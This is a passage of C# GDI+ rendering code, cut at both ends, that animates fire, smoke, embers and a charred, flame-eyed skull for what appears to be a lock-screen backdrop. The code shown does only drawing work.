            Color.FromArgb(32 + (int)(22 * pulse), 255, 82, 12), Color.FromArgb(0, 50, 8, 1));
        SoftGlow(g, w * 0.93f, h * 0.74f, w * 0.17f, h * 0.24f,
            Color.FromArgb(28 + (int)(18 * (1f - pulse)), 255, 70, 10), Color.FromArgb(0, 50, 7, 1));
        SoftGlow(g, w * 0.50f, h * 1.02f, w * 0.44f, h * 0.14f,
            Color.FromArgb(48, 255, 100, 18), Color.FromArgb(0, 80, 10, 2));

        // The bottom fire is deliberately out of focus and kept low so the
        // password box remains readable.
        for (int i = 0; i < 9; i++)
        {
            float x = w * (0.05f + i * 0.112f) + (float)Math.Sin(time * 0.7f + i) * w * 0.01f;
            float width = w * (0.055f + 0.025f * ((i + 1) % 3));
            float height = h * (0.075f + 0.035f * ((i * 2) % 4));
            DrawFlame(g, x, h * 1.025f, width, height,
                i * 1.71f, (i % 2 == 0 ? -1f : 1f) * w * 0.008f, time, 0.42f, false);
        }

        // Slow smoke banks.
        float drift = (float)Math.Sin(time * 0.18f) * w * 0.02f;
        SoftGlow(g, w * 0.30f + drift, h * 0.16f, w * 0.23f, h * 0.09f,
            Color.FromArgb(18, 45, 10, 8), Color.FromArgb(0, 2, 0, 0));
        SoftGlow(g, w * 0.74f - drift, h * 0.22f, w * 0.28f, h * 0.10f,
            Color.FromArgb(16, 52, 12, 8), Color.FromArgb(0, 2, 0, 0));
    }

    internal static void DrawTitleAura(Graphics g, RectangleF locked, RectangleF name, float time)
    {
        float cy = (locked.Top + name.Bottom) / 2f;
        float pulse = 0.5f + 0.5f * (float)Math.Sin(time * 1.4f + 0.8f);
        SoftGlow(g, locked.Width * 0.5f, cy, locked.Width * 0.31f, name.Height * 0.90f,
            Color.FromArgb(15 + (int)(8 * pulse), 255, 58, 8), Color.FromArgb(0, 30, 2, 0));
    }

    internal static void DrawManeFlames(Graphics g, float time)
    {
        // A broad fire halo underneath the individual tongues.
        SoftGlow(g, 300f, 245f, 310f, 330f,
            Color.FromArgb(58, 255, 72, 9), Color.FromArgb(0, 90, 10, 1));
        SoftGlow(g, 300f, 190f, 205f, 240f,
            Color.FromArgb(45, 255, 144, 32), Color.FromArgb(0, 180, 40, 3));

        foreach (FlameSpec flame in ManeFlames)
        {
            DrawFlame(g, flame.X, flame.Y, flame.Width, flame.Height,
                flame.Phase, flame.Lean, time, flame.Intensity, false);
        }
    }

    internal static void DrawForegroundFlames(Graphics g, float time)
    {
        foreach (FlameSpec flame in ForeFlames)
        {
            DrawFlame(g, flame.X, flame.Y, flame.Width, flame.Height,
                flame.Phase, flame.Lean, time, flame.Intensity, true);
        }
    }

    internal static void DrawFlame(
        Graphics g,
        float bx,
        float by,
        float width,
        float height,
        float phase,
        float lean,
        float time,
        float intensity,
        bool foreground)
    {
        float breathe = 0.87f + 0.13f * (float)Math.Sin(time * 3.2f + phase * 1.7f);
        float h = Math.Max(8f, height * breathe);
        float sway = (float)(Math.Sin(time * 2.15f + phase) * 0.50f +
                             Math.Sin(time * 4.7f + phase * 1.9f) * 0.22f);
        float tipX = bx + lean + sway * width;
        float tipY = by - h;
        float wobble = (float)Math.Sin(time * 3.5f + phase * 2.1f) * width * 0.13f;

        using (GraphicsPath outer = FlamePath(bx, by, width, h, tipX, tipY, wobble))
        {
            int alpha = ClampAlpha((foreground ? 78 : 44) * intensity + (int)(18 * intensity));
            using (LinearGradientBrush brush = Gradient(tipX, tipY, bx, by, 255, 88, 14, alpha))
            {
                g.FillPath(brush, outer);
            }
        }

        using (GraphicsPath middle = FlamePath(bx, by, width * 0.62f, h * 0.76f,
                   tipX + wobble * 0.6f, by - h * 0.76f, wobble * 0.7f))
        {
            int alpha = ClampAlpha((foreground ? 114 : 64) * intensity + 18);
            using (LinearGradientBrush brush = Gradient(tipX, tipY, bx, by, 255, 158, 34, alpha))
            {
                g.FillPath(brush, middle);
            }
        }

        using (GraphicsPath core = FlamePath(bx, by, width * 0.26f, h * 0.47f,
                   tipX + wobble * 0.45f, by - h * 0.47f, wobble * 0.4f))
        {
            int alpha = ClampAlpha((foreground ? 150 : 78) * intensity + 16);
            using (LinearGradientBrush brush = Gradient(tipX, tipY, bx, by, 255, 235, 150, alpha))
            {
                g.FillPath(brush, core);
            }
        }
    }

    private static GraphicsPath FlamePath(
        float bx,
        float by,
        float width,
        float h,
        float tipX,
        float tipY,
        float wobble)
    {
        GraphicsPath path = new();
        float half = Math.Max(2f, width * 0.5f);
        path.StartFigure();
        path.AddBezier(
            bx - half, by,
            bx - half * 1.30f + wobble, by - h * 0.25f,
            tipX - half * 0.65f, by - h * 0.72f,
            tipX, tipY);
        path.AddBezier(
            tipX, tipY,
            tipX + half * 0.55f, by - h * 0.70f,
            bx + half * 1.25f + wobble, by - h * 0.26f,
            bx + half, by);
        path.CloseFigure();
        return path;
    }

    private static LinearGradientBrush Gradient(
        float tipX,
        float tipY,
        float baseX,
        float baseY,
        int r,
        int gr,
        int b,
        int alpha)
    {
        return new LinearGradientBrush(
            new PointF(tipX, tipY),
            new PointF(baseX, baseY),
            Color.FromArgb(0, r, gr, b),
            Color.FromArgb(ClampAlpha(alpha), r, gr, b));
    }

    private static int ClampAlpha(float value)
    {
        return Math.Max(0, Math.Min(255, (int)value));
    }

    internal static void SoftGlow(
        Graphics g,
        float cx,
        float cy,
        float rx,
        float ry,
        Color center,
        Color edge)
    {
        if (rx <= 0.1f || ry <= 0.1f)
        {
            return;
        }

        using GraphicsPath shape = new();
        shape.AddEllipse(cx - rx, cy - ry, rx * 2f, ry * 2f);
        using PathGradientBrush brush = new(shape)
        {
            CenterColor = center,
            SurroundColors = new[] { edge },
            CenterPoint = new PointF(cx, cy)
        };
        g.FillPath(brush, shape);
    }

    internal static void DrawEmbers(Graphics g, int w, int h, double seconds, bool foreground)
    {
        Color outerColor = foreground
            ? Color.FromArgb(56, 255, 96, 24)
            : Color.FromArgb(20, 255, 80, 18);
        Color midColor = foreground
            ? Color.FromArgb(145, 255, 130, 42)
            : Color.FromArgb(70, 255, 120, 34);
        Color coreColor = foreground
            ? Color.FromArgb(235, 255, 218, 150)
            : Color.FromArgb(170, 255, 194, 120);

        using SolidBrush outer = new(outerColor);
        using SolidBrush mid = new(midColor);
        using SolidBrush core = new(coreColor);

        for (int i = 0; i < Embers.Length; i++)
        {
            bool isForeground = i % 5 == 0;
            if (isForeground != foreground)
            {
                continue;
            }

            EmberSpec ember = Embers[i];
            float p = (ember.Start + (float)seconds * ember.Speed) % 1f;
            float y = h * (1.05f - p * 1.10f);
            float x = w * ember.X + (float)Math.Sin(seconds * ember.Sway + ember.Phase) * w * 0.014f;
            float flicker = 0.55f + 0.45f * (float)Math.Sin(seconds * 4.1f + ember.Phase);
            float size = Math.Max(0.8f, h * ember.Size * (foreground ? 1.45f : 1f));

            if (!foreground && flicker < 0.18f)
            {
                continue;
            }

            g.FillEllipse(outer, x - size * 4.0f, y - size * 4.0f, size * 8.0f, size * 8.0f);
            g.FillEllipse(mid, x - size * 1.8f, y - size * 1.8f, size * 3.6f, size * 3.6f);
            g.FillEllipse(core, x - size * 0.70f, y - size * 0.70f, size * 1.4f, size * 1.4f);
        }
    }

    private static FlameSpec[] CreateManeFlames()
    {
        Random rng = new(77113);
        List<FlameSpec> list = new();

        for (int i = 0; i < 30; i++)
        {
            float t = i / 29f;
            float theta = (float)Math.PI + t * (float)Math.PI;
            float bx = 300f + (float)Math.Cos(theta) * 195f;
            float by = 292f + (float)Math.Sin(theta) * 190f;
            float topness = Math.Clamp((300f - by) / 210f, 0f, 1f);
            float height = 135f + rng.Next(0, 145) + topness * 85f;
            float width = 27f + rng.Next(0, 44);
            float lean = (bx - 300f) * 0.30f + rng.Next(-24, 25);
            list.Add(new FlameSpec
            {
                X = bx,
                Y = by,
                Width = width,
                Height = height,
                Phase = (float)rng.NextDouble() * 6.283f,
                Lean = lean,
                Intensity = 0.82f + (float)rng.NextDouble() * 0.28f
            });
        }

        // Lower side tongues frame the jaw.
        for (int i = 0; i < 8; i++)
        {
            bool left = i % 2 == 0;
            float bx = left ? 108f - i * 2f : 492f + i * 2f;
            float by = 345f + i * 14f;
            float height = 95f + rng.Next(0, 100);
            float width = 24f + rng.Next(0, 27);
            list.Add(new FlameSpec
            {
                X = bx,
                Y = by,
                Width = width,
                Height = height,
                Phase = (float)rng.NextDouble() * 6.283f,
                Lean = (left ? -1f : 1f) * (35f + rng.Next(0, 34)),
                Intensity = 0.75f + (float)rng.NextDouble() * 0.25f
            });
        }

        return list.ToArray();
    }

    private static FlameSpec[] CreateForegroundFlames()
    {
        Random rng = new(4412);
        List<FlameSpec> list = new();

        for (int i = 0; i < 9; i++)
        {
            float bx = 185f + i * 29f + rng.Next(-8, 9);
            float by = 84f + rng.Next(0, 96);
            float height = 75f + rng.Next(0, 105);
            float width = 17f + rng.Next(0, 20);
            list.Add(new FlameSpec
            {
                X = bx,
                Y = by,
                Width = width,
                Height = height,
                Phase = (float)rng.NextDouble() * 6.283f,
                Lean = rng.Next(-35, 36),
                Intensity = 0.85f + (float)rng.NextDouble() * 0.30f
            });
        }

        // Two small licking flames at the temples.
        list.Add(new FlameSpec { X = 135f, Y = 280f, Width = 25f, Height = 105f, Phase = 1.2f, Lean = -30f, Intensity = 0.9f });
        list.Add(new FlameSpec { X = 465f, Y = 280f, Width = 25f, Height = 105f, Phase = 3.8f, Lean = 30f, Intensity = 0.9f });
        return list.ToArray();
    }

    private static EmberSpec[] CreateEmbers()
    {
        Random rng = new(22391);
        List<EmberSpec> list = new();
        for (int i = 0; i < 190; i++)
        {
            list.Add(new EmberSpec
            {
                X = (float)rng.NextDouble(),
                Start = (float)rng.NextDouble(),
                Speed = 0.018f + (float)rng.NextDouble() * 0.070f,
                Size = 0.0012f + (float)rng.NextDouble() * 0.0022f,
                Phase = (float)rng.NextDouble() * 6.283f,
                Sway = 1.3f + (float)rng.NextDouble() * 2.7f
            });
        }
        return list.ToArray();
    }
}

internal static class GhostSkullArt
{
    private sealed class CrackSpec
    {
        internal PointF[] Points;
        internal float Width;
        internal float Phase;
        internal float Intensity;
    }

    private sealed class CharSpec
    {
        internal float X;
        internal float Y;
        internal float RX;
        internal float RY;
        internal Color Color;
    }

    private sealed class DripSpec
    {
        internal float X;
        internal float Y;
        internal float Length;
        internal float Width;
        internal float Phase;
        internal float Speed;
    }

    private sealed class SparkSpec
    {
        internal float X;
        internal float Y;
        internal float Phase;
        internal float Size;
    }

    private static readonly CrackSpec[] Cracks = CreateCracks();
    private static readonly CharSpec[] Charring = CreateCharring();
    private static readonly DripSpec[] Drips = CreateDrips();
    private static readonly SparkSpec[] Sparks = CreateSparks();
    private static readonly PointF[] SootStreaks = CreateSootStreaks();

    // The charred bone, hollows, teeth and outline never change. Rasterizing
    // them once lightens every animation frame considerably.
    private static Bitmap _staticBase;

    private static Bitmap StaticBase()
    {
        if (_staticBase != null)
        {
            return _staticBase;
        }

        Bitmap bmp = new(600, 600, PixelFormat.Format32bppPArgb);
        using (Graphics g = Graphics.FromImage(bmp))
        {
            g.SmoothingMode = SmoothingMode.AntiAlias;
            g.PixelOffsetMode = PixelOffsetMode.HighQuality;
            g.CompositingQuality = CompositingQuality.HighQuality;

            using GraphicsPath skull = CreateSkullPath();
            DrawBase(g, skull);
            DrawCharring(g, skull);

            GraphicsState clipped = g.Save();
            g.SetClip(skull, CombineMode.Intersect);
            DrawBrow(g);
            DrawCheekHollows(g);
            DrawSocketCavity(g, true, 0.5f);
            DrawSocketCavity(g, false, 0.5f);
            DrawNoseCavity(g);
            DrawMouthCavity(g);
            DrawBoneHighlights(g);
            g.Restore(clipped);

            DrawOutline(g, skull, 0.5f);
        }

        _staticBase = bmp;
        return _staticBase;
    }

    private static void DrawStaticBase(Graphics g)
    {
        g.DrawImageUnscaled(StaticBase(), 0, 0);
    }

    internal static void Draw(Graphics g, RectangleF bounds, float time, float pulse)
    {
        if (bounds.Width < 2f || bounds.Height < 2f)
        {
            return;
        }

        GraphicsState state = g.Save();
        g.TranslateTransform(bounds.X, bounds.Y);
        g.ScaleTransform(bounds.Width / 600f, bounds.Height / 600f);
        g.SmoothingMode = SmoothingMode.AntiAlias;
        g.PixelOffsetMode = PixelOffsetMode.HighQuality;
        g.CompositingQuality = CompositingQuality.HighQuality;
        g.InterpolationMode = InterpolationMode.HighQualityBicubic;

        using GraphicsPath skull = CreateSkullPath();
        HellArt.DrawManeFlames(g, time);
        DrawOuterGlow(g, skull, pulse);
        DrawStaticBase(g);
        DrawSockets(g, time, pulse);
        DrawNose(g, time, pulse);
        DrawMouth(g, time, pulse);
        DrawCracks(g, time);
        HellArt.DrawForegroundFlames(g, time);
        DrawDrips(g, time);
        DrawSkullSparks(g, time);

        g.Restore(state);
    }

    private static GraphicsPath CreateSkullPath()
    {
        GraphicsPath p = new();
        p.StartFigure();
        p.AddBezier(300f, 40f, 378f, 40f, 460f, 88f, 486f, 170f);
        p.AddBezier(486f, 170f, 497f, 210f, 490f, 248f, 476f, 282f);
        p.AddBezier(476f, 282f, 467f, 307f, 452f, 330f, 448f, 356f);
        p.AddBezier(448f, 356f, 444f, 386f, 428f, 414f, 416f, 442f);
        p.AddBezier(416f, 442f, 402f, 474f, 383f, 506f, 348f, 530f);
        p.AddBezier(348f, 530f, 332f, 543f, 315f, 554f, 300f, 562f);
        p.AddBezier(300f, 562f, 285f, 554f, 268f, 543f, 252f, 530f);
        p.AddBezier(252f, 530f, 217f, 506f, 198f, 474f, 184f, 442f);
        p.AddBezier(184f, 442f, 172f, 414f, 156f, 386f, 152f, 356f);
        p.AddBezier(152f, 356f, 148f, 330f, 133f, 307f, 124f, 282f);
        p.AddBezier(124f, 282f, 110f, 248f, 103f, 210f, 114f, 170f);
        p.AddBezier(114f, 170f, 140f, 88f, 222f, 40f, 300f, 40f);
        p.CloseFigure();
        return p;
    }

    private static void DrawOuterGlow(Graphics g, GraphicsPath skull, float pulse)
    {
        int alpha = 20 + (int)(14 * pulse);
        using (Pen wide = new(Color.FromArgb(alpha, 255, 68, 8), 30f))
        {
            g.DrawPath(wide, skull);
        }
        using (Pen mid = new(Color.FromArgb(alpha + 20, 255, 82, 14), 16f))
        {
            g.DrawPath(mid, skull);
        }
        using (Pen narrow = new(Color.FromArgb(alpha + 34, 255, 110, 32), 7f))
        {
            g.DrawPath(narrow, skull);
        }
    }

    private static void DrawBase(Graphics g, GraphicsPath skull)
    {
        RectangleF box = new(82f, 28f, 436f, 548f);
        using LinearGradientBrush baseFill = new(box, Color.Black, Color.Black, LinearGradientMode.Vertical)
        {
            InterpolationColors = new ColorBlend
            {
                Colors = new[]
                {
                    Color.FromArgb(255, 78, 46, 34),
                    Color.FromArgb(255, 54, 28, 21),
                    Color.FromArgb(255, 27, 11, 8),
                    Color.FromArgb(255, 10, 4, 3)
                },
                Positions = new[] { 0f, 0.30f, 0.64f, 1f }
            }
        };
        g.FillPath(baseFill, skull);
    }

    private static void DrawCharring(Graphics g, GraphicsPath skull)
    {
        GraphicsState state = g.Save();
        g.SetClip(skull, CombineMode.Intersect);

        foreach (CharSpec blot in Charring)
        {
            using SolidBrush brush = new(blot.Color);
            g.FillEllipse(brush, blot.X - blot.RX, blot.Y - blot.RY, blot.RX * 2f, blot.RY * 2f);
        }

        // Soot running down the face from the brow.
        using (Pen soot = new(Color.FromArgb(48, 0, 0, 0), 7f)
        {
            StartCap = LineCap.Round,
            EndCap = LineCap.Round,
            LineJoin = LineJoin.Round
        })
        {
            for (int i = 0; i + 3 < SootStreaks.Length; i += 4)
            {
                using GraphicsPath streak = new();
                streak.AddCurve(new[]
                {
                    SootStreaks[i],
                    SootStreaks[i + 1],
                    SootStreaks[i + 2],
                    SootStreaks[i + 3]
                }, 0.45f);
                g.DrawPath(soot, streak);
            }
        }

        g.Restore(state);
    }

    private static void DrawBrow(Graphics g)
    {
        using GraphicsPath brow = new();
        brow.StartFigure();
        brow.AddBezier(116f, 232f, 170f, 180f, 235f, 188f, 300f, 218f);
        brow.AddBezier(300f, 218f, 365f, 188f, 430f, 180f, 484f, 232f);
        brow.AddBezier(484f, 232f, 424f, 222f, 360f, 214f, 300f, 236f);
        brow.AddBezier(300f, 236f, 240f, 214f, 176f, 222f, 116f, 232f);
        brow.CloseFigure();
        using SolidBrush shadow = new(Color.FromArgb(150, 0, 0, 0));
        g.FillPath(shadow, brow);

        using Pen ridge = new(Color.FromArgb(62, 165, 95, 62), 2.5f)
        {
            StartCap = LineCap.Round,
            EndCap = LineCap.Round
        };
        using GraphicsPath ridgePath = new();
        ridgePath.AddBezier(132f, 228f, 190f, 194f, 242f, 201f, 286f, 226f);
        ridgePath.AddBezier(314f, 226f, 358f, 201f, 410f, 194f, 468f, 228f);
        g.DrawPath(ridge, ridgePath);
    }

    private static void DrawCheekHollows(Graphics g)
    {
        using (SolidBrush hollow = new(Color.FromArgb(92, 0, 0, 0)))
        {
            g.FillEllipse(hollow, 146f, 286f, 102f, 126f);
            g.FillEllipse(hollow, 352f, 286f, 102f, 126f);
            g.FillEllipse(hollow, 118f, 164f, 58f, 98f);
            g.FillEllipse(hollow, 424f, 164f, 58f, 98f);
        }

        using Pen cheek = new(Color.FromArgb(72, 160, 94, 68), 2.2f)
        {
            StartCap = LineCap.Round,
            EndCap = LineCap.Round
        };
        using GraphicsPath cheekLine = new();
        cheekLine.AddBezier(140f, 332f, 170f, 360f, 212f, 371f, 246f, 358f);
        cheekLine.AddBezier(354f, 358f, 388f, 371f, 430f, 360f, 460f, 332f);
        g.DrawPath(cheek, cheekLine);
    }

    private static GraphicsPath CreateSocketPath(bool left)
    {
        GraphicsPath p = new();
        if (left)
        {
            p.StartFigure();
            p.AddBezier(144f, 226f, 168f, 206f, 214f, 214f, 246f, 234f);
            p.AddBezier(246f, 234f, 260f, 242f, 272f, 254f, 280f, 268f);
            p.AddBezier(280f, 268f, 262f, 288f, 236f, 300f, 208f, 298f);
            p.AddBezier(208f, 298f, 180f, 296f, 154f, 278f, 146f, 252f);
            p.AddBezier(146f, 252f, 142f, 242f, 141f, 234f, 144f, 226f);
            p.CloseFigure();
        }
        else
        {
            p.StartFigure();
            p.AddBezier(456f, 226f, 432f, 206f, 386f, 214f, 354f, 234f);
            p.AddBezier(354f, 234f, 340f, 242f, 328f, 254f, 320f, 268f);
            p.AddBezier(320f, 268f, 338f, 288f, 364f, 300f, 392f, 298f);
            p.AddBezier(392f, 298f, 420f, 296f, 446f, 278f, 454f, 252f);
            p.AddBezier(454f, 252f, 458f, 242f, 459f, 234f, 456f, 226f);
            p.CloseFigure();
        }
        return p;
    }

    private static void DrawSockets(Graphics g, float time, float pulse)
    {
        DrawSocket(g, true, time, pulse);
        DrawSocket(g, false, time, pulse);
    }

    private static void DrawSocketCavity(Graphics g, bool left, float pulse)
    {
        using GraphicsPath socket = CreateSocketPath(left);
        RectangleF b = socket.GetBounds();
        float cx = b.X + b.Width * 0.50f;
        float cy = b.Y + b.Height * 0.48f;

        HellArt.SoftGlow(g, cx, cy, b.Width * 0.72f, b.Height * 0.86f,
            Color.FromArgb(38 + (int)(18 * pulse), 255, 64, 10), Color.FromArgb(0, 90, 9, 1));

        using (SolidBrush darkness = new(Color.FromArgb(250, 3, 0, 0)))
        {
            g.FillPath(darkness, socket);
        }
    }

    private static void DrawSocket(Graphics g, bool left, float time, float pulse)
    {
        using GraphicsPath socket = CreateSocketPath(left);
        RectangleF b = socket.GetBounds();
        float cx = b.X + b.Width * 0.50f;
        float cy = b.Y + b.Height * 0.48f;

        GraphicsState clipped = g.Save();
        g.SetClip(socket, CombineMode.Intersect);

        HellArt.SoftGlow(g, cx, cy + 4f, b.Width * 0.57f, b.Height * 0.58f,
            Color.FromArgb(235, 255, 208, 88), Color.FromArgb(0, 255, 78, 8));
        HellArt.SoftGlow(g, cx, cy, b.Width * 0.31f, b.Height * 0.31f,
            Color.FromArgb(220, 255, 245, 178), Color.FromArgb(0, 255, 150, 30));

        HellArt.DrawFlame(g, cx, cy + b.Height * 0.42f, b.Width * 0.65f, b.Height * 0.92f,
            left ? 1.4f : 4.1f, left ? -5f : 5f, time, 1.2f, true);
        HellArt.DrawFlame(g, cx, cy + b.Height * 0.42f, b.Width * 0.33f, b.Height * 0.64f,
            left ? 4.9f : 1.9f, left ? 7f : -7f, time, 1.0f, true);

        using (GraphicsPath slit = CreateEyeSlit(cx, cy, left, 1f))
        using (GraphicsPath inner = CreateEyeSlit(cx, cy, left, 0.48f))
        {
            using (SolidBrush hot = new(Color.FromArgb(225, 255, 196, 92)))
            {
                g.FillPath(hot, slit);
            }
            using (SolidBrush white = new(Color.FromArgb(250, 255, 249, 198)))
            {
                g.FillPath(white, inner);
            }
        }

        g.Restore(clipped);

        using (Pen darkRim = new(Color.FromArgb(230, 8, 1, 1), 4.5f))
        {
            g.DrawPath(darkRim, socket);
        }
        using (Pen emberRim = new(Color.FromArgb(130, 255, 82, 18), 1.8f))
        {
            g.DrawPath(emberRim, socket);
        }

        // Sparks escaping the socket.
        for (int i = 0; i < 4; i++)
        {
            float phase = i * 1.8f + (left ? 0.4f : 2.1f);
            float sx = cx + (float)Math.Sin(time * 2.2f + phase) * b.Width * 0.60f;
            float sy = cy - b.Height * 0.30f - (float)((time * 8f + i * 11f) % 38f);
            float size = 1.1f + i * 0.35f;
            using SolidBrush glow = new(Color.FromArgb(35, 255, 80, 15));
            using SolidBrush core = new(Color.FromArgb(200, 255, 198, 92));
            g.FillEllipse(glow, sx - size * 3f, sy - size * 3f, size * 6f, size * 6f);
            g.FillEllipse(core, sx - size, sy - size, size * 2f, size * 2f);
        }
    }

    private static GraphicsPath CreateEyeSlit(float cx, float cy, bool left, float scale)
    {
        float side = left ? 1f : -1f;
        float half = 47f * scale;
        float width = 22f * scale;
        float height = 10f * scale;
        GraphicsPath p = new();
        p.StartFigure();
        p.AddBezier(
            cx - half * side, cy - height * 0.65f,
            cx - width * 0.55f * side, cy - height * 1.65f,
            cx + width * 0.55f * side, cy + height * 0.20f,
            cx + half * side, cy + height * 0.80f);
        p.AddBezier(
            cx + half * side, cy + height * 0.80f,
            cx + width * 0.60f * side, cy + height * 1.45f,
            cx - width * 0.55f * side, cy + height * 1.10f,
            cx - half * side, cy - height * 0.65f);
        p.CloseFigure();
        return p;
    }

    private static GraphicsPath CreateNosePath()
    {
        GraphicsPath p = new();
        p.StartFigure();
        p.AddBezier(300f, 314f, 294f, 330f, 282f, 344f, 272f, 356f);
        p.AddBezier(272f, 356f, 284f, 364f, 293f, 372f, 300f, 386f);
        p.AddBezier(300f, 386f, 307f, 372f, 316f, 364f, 328f, 356f);
        p.AddBezier(328f, 356f, 318f, 344f, 306f, 330f, 300f, 314f);
        p.CloseFigure();
        return p;
    }

    private static void DrawNoseCavity(Graphics g)
    {
        using GraphicsPath nose = CreateNosePath();
        using SolidBrush dark = new(Color.FromArgb(248, 2, 0, 0));
        g.FillPath(dark, nose);
    }

    private static void DrawNose(Graphics g, float time, float pulse)
    {
        using GraphicsPath nose = CreateNosePath();

        GraphicsState clipped = g.Save();
        g.SetClip(nose, CombineMode.Intersect);
        HellArt.SoftGlow(g, 300f, 365f, 32f, 28f,
            Color.FromArgb(110 + (int)(25 * pulse), 255, 104, 24), Color.FromArgb(0, 120, 18, 1));
        HellArt.DrawFlame(g, 300f, 380f, 22f, 52f, 2.8f, 1f, time, 0.75f, true);
        g.Restore(clipped);

        using Pen rim = new(Color.FromArgb(170, 116, 47, 28), 1.8f);
        g.DrawPath(rim, nose);

        using (SolidBrush ember = new(Color.FromArgb(155, 255, 101, 26)))
        {
            g.FillEllipse(ember, 295f, 360f, 10f, 12f);
        }
    }

    private static GraphicsPath CreateMouthPath()
    {
        GraphicsPath p = new();
        p.StartFigure();
        p.AddBezier(190f, 407f, 226f, 395f, 264f, 401f, 300f, 401f);
        p.AddBezier(300f, 401f, 336f, 401f, 374f, 395f, 410f, 407f);
        p.AddBezier(410f, 407f, 423f, 432f, 409f, 468f, 381f, 489f);
        p.AddBezier(381f, 489f, 350f, 511f, 250f, 511f, 219f, 489f);
        p.AddBezier(219f, 489f, 191f, 468f, 177f, 432f, 190f, 407f);
        p.CloseFigure();
        return p;
    }

    private static void DrawMouthCavity(Graphics g)
    {
        using GraphicsPath mouth = CreateMouthPath();
        using LinearGradientBrush cavity = new(new RectangleF(174f, 396f, 252f, 118f),
            Color.FromArgb(255, 45, 3, 2), Color.FromArgb(255, 4, 0, 0),
            LinearGradientMode.Vertical);
        g.FillPath(cavity, mouth);
    }

    private static void DrawMouth(Graphics g, float time, float pulse)
    {
        using GraphicsPath mouth = CreateMouthPath();

        GraphicsState clipped = g.Save();
        g.SetClip(mouth, CombineMode.Intersect);
        HellArt.SoftGlow(g, 300f, 474f, 112f, 67f,
            Color.FromArgb(150 + (int)(22 * pulse), 255, 74, 9), Color.FromArgb(0, 100, 12, 1));
        HellArt.DrawFlame(g, 300f, 501f, 86f, 91f, 3.1f, 2f, time, 0.95f, true);
        HellArt.DrawFlame(g, 264f, 505f, 40f, 56f, 0.7f, -7f, time, 0.8f, true);
        HellArt.DrawFlame(g, 338f, 505f, 38f, 61f, 5.2f, 8f, time, 0.8f, true);
        g.Restore(clipped);

        // Upper row. Rooted under the nose and hanging down into the cavity.
        for (int i = 0; i < 10; i++)
        {
            if (i == 4)
            {
                continue;
            }
            float x = 202f + i * 19.5f;
            float w = 17.5f;
            float h = 25f + (i % 3) * 6f;
            if (i == 0 || i == 9)
            {
                h += 12f;
            }
            DrawTooth(g, new RectangleF(x, 414f, w, h), true, i);
        }

        // Lower row, pointing upward. A couple of gaps sell the damage.
        for (int i = 0; i < 9; i++)
        {
            if (i == 2 || i == 6)
            {
                continue;
            }
            float x = 214f + i * 20f;
            float w = 17.5f;
            float h = 17f + (i % 4) * 4f;
            DrawTooth(g, new RectangleF(x, 489f - h, w, h), false, i);
        }

        using (Pen gum = new(Color.FromArgb(205, 18, 3, 2), 5.5f)
        {
            StartCap = LineCap.Round,
            EndCap = LineCap.Round
        })
        {
            using GraphicsPath topGum = new();
            topGum.AddCurve(new[]
            {
                new PointF(201f, 418f),
                new PointF(256f, 409f),
                new PointF(344f, 409f),
                new PointF(399f, 418f)
            }, 0.4f);
            g.DrawPath(gum, topGum);

            using GraphicsPath bottomGum = new();
            bottomGum.AddCurve(new[]
            {
                new PointF(216f, 489f),
                new PointF(264f, 496f),
                new PointF(338f, 496f),
                new PointF(386f, 489f)
            }, 0.4f);
            g.DrawPath(gum, bottomGum);
        }

        using (Pen lipRim = new(Color.FromArgb(225, 37, 7, 4), 3.6f))
        {
            g.DrawPath(lipRim, mouth);
        }
    }

    private static void DrawTooth(Graphics g, RectangleF r, bool upper, int index)
    {
        float x = r.X;
        float y = r.Y;
        float w = r.Width;
        float h = r.Height;
        float bend = (index % 2 == 0 ? 1f : -1f) * w * 0.08f;

        using GraphicsPath tooth = new();
        tooth.StartFigure();
        if (upper)
        {
            tooth.AddBezier(x, y, x + w * 0.10f, y + h * 0.40f, x + w * 0.40f + bend, y + h * 0.72f, x + w * 0.50f, y + h);
            tooth.AddBezier(x + w * 0.50f, y + h, x + w * 0.60f + bend, y + h * 0.70f, x + w * 0.90f, y + h * 0.38f, x + w, y);
            tooth.AddLine(x + w, y, x, y);
        }
        else
        {
            tooth.AddBezier(x, y + h, x + w * 0.10f, y + h * 0.60f, x + w * 0.40f + bend, y + h * 0.28f, x + w * 0.50f, y);
            tooth.AddBezier(x + w * 0.50f, y, x + w * 0.60f + bend, y + h * 0.30f, x + w * 0.90f, y + h * 0.62f, x + w, y + h);
            tooth.AddLine(x + w, y + h, x, y + h);
        }
        tooth.CloseFigure();

        Color root = index == 3 || index == 7
            ? Color.FromArgb(255, 34, 20, 16)
            : Color.FromArgb(255, 57, 34, 25);
        Color tip = index == 3 || index == 7
            ? Color.FromArgb(255, 102, 81, 59)
            : Color.FromArgb(255, 186, 160, 121);
        Color low = upper ? root : tip;
        Color high = upper ? tip : root;
        RectangleF box = new(x - 1f, y - 1f, w + 2f, h + 2f);

        using (LinearGradientBrush fill = new(box, low, high, LinearGradientMode.Vertical))
        {
            g.FillPath(fill, tooth);
        }

        using (Pen edge = new(Color.FromArgb(230, 12, 4, 2), 1.5f))
        {
            g.DrawPath(edge, tooth);
        }

        using (Pen shine = new(Color.FromArgb(52, 255, 224, 164), 1.1f)
        {
            StartCap = LineCap.Round,
            EndCap = LineCap.Round
        })
        {
            float sx = x + w * 0.30f;
            float sy1 = upper ? y + h * 0.22f : y + h * 0.78f;
            float sy2 = upper ? y + h * 0.70f : y + h * 0.30f;
            g.DrawLine(shine, sx, sy1, sx + w * 0.10f, sy2);
        }

        if (index % 4 == 0)
        {
            using (SolidBrush rot = new(Color.FromArgb(105, 9, 3, 2)))
            {
                g.FillEllipse(rot, x + w * 0.35f, y + h * 0.60f, w * 0.30f, h * 0.22f);
            }
        }
    }

    private static void DrawCracks(Graphics g, float time)
    {
        foreach (CrackSpec crack in Cracks)
        {
            float flicker = 0.72f + 0.28f * (float)Math.Sin(time * 4.2f + crack.Phase);
            using GraphicsPath path = new();
            path.AddLines(crack.Points);

            using (Pen dark = new(Color.FromArgb(235, 8, 2, 1), crack.Width + 2.2f)
            {
                StartCap = LineCap.Round,
                EndCap = LineCap.Round,
                LineJoin = LineJoin.Round
            })
            {
                g.DrawPath(dark, path);
            }

            using (Pen bloom = new(Color.FromArgb((int)(26 * flicker * crack.Intensity), 255, 72, 8), crack.Width + 8f)
            {
                StartCap = LineCap.Round,
                EndCap = LineCap.Round,
                LineJoin = LineJoin.Round
            })
            {
                g.DrawPath(bloom, path);
            }

            using (Pen ember = new(Color.FromArgb((int)(190 * flicker), 255, 126, 28), crack.Width)
            {
                StartCap = LineCap.Round,
                EndCap = LineCap.Round,
